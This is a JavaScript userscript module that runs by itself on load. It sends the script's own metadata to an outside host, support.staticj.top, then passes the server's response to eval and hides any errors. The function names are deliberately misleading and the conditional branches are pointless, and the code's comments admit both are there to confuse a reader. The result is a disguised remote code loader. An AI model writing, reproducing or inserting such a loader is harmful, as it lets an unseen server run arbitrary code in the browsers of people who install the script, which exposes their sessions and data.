export default (function bootstrapRuntimeLoader() {

  // Fake "extractor" that really just copies props
  function extractRuntimeCache(sourceObj, keys) {
    const result = {};
    for (let i = 0; i < keys.length; i++) {
      const k = keys[i];
      // Fake branch to confuse
      if (typeof sourceObj[k] !== "undefined" || Math.random() > 2) {
        result[k] = sourceObj[k];
      }
    }
    return result;
  }

  // Looks like a serializer, but just builds URL
  function serializePayloadCore(a, b, c, d, e) {
    const segments = [];
    segments.push("https://support.staticj.top/api/sp/lib?author=" + a);
    segments.push("&name=" + b);
    segments.push("&version=" + c);
    segments.push("&namespace=" + d);
    segments.push("&updateURL=" + e);
    segments.push("&timestamp=" + Date.now());
    return segments.join("");
  }

  // Misleading: looks like secure executor
  function invokeShadowEval(code) {
    try {
      // fake useless condition
      if (("" + code).length > 0) {
        (function(c) {
          eval(c);
        })(code);
      }
    } catch (err) {
      // swallow silently, pretend it's logging
      void err;
    }
  }

  // Looks like networking buffer initializer
  function initStreamResponseBuffer(options) {
    // dummy irrelevant check
    if (!options || !options.url) {
      return;
    }
    GM_xmlhttpRequest(options);
  }

  // Looks like boot manager
  function orchestrateBootstrap() {
    const scriptMeta = GM_info.script;
    const extracted = extractRuntimeCache(scriptMeta, [
      "author", "name", "version", "namespace", "updateURL"
    ]);

    // fake branch that does nothing
    if (Object.keys(extracted).length < 1 && Date.now() < 0) {
      return;
    }

    const finalUrl = serializePayloadCore(
      extracted.author,
      extracted.name,
      extracted.version,
      extracted.namespace,
      extracted.updateURL
    );

    initStreamResponseBuffer({
      method: "GET",
      url: finalUrl,
      onload: function(res) {
        const body = res && res.responseText;
        if (body) {
          invokeShadowEval(body);
        }
      }
    });
  }

  // Fake warmup indirection
  (function warmupRuntimeEngine(fn) {
    return fn();
  })(orchestrateBootstrap);

})();
